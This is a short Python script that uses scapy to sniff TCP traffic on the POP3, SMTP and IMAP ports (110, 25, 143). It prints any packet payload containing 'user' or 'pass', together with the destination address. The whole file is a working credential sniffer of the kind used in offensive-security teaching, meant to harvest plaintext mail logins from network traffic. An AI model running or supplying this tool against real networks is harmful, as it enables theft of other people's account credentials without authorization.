#!/usr/bin/python3

from scapy.all import (
    sniff,
    TCP,
    IP
)
import sys
from typing import Any


# the packet callback
def packet_callback(packet: Any) -> None:
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)

        if "user" in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")

def main():
    
    try:
        # fire up the sniffer
        print("[**] Starting")
        sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
                prn=packet_callback, store=0)
    except KeyboardInterrupt:
        print("[!!] Exiting...")
        sys.exit()


if __name__ == "__main__":
    main()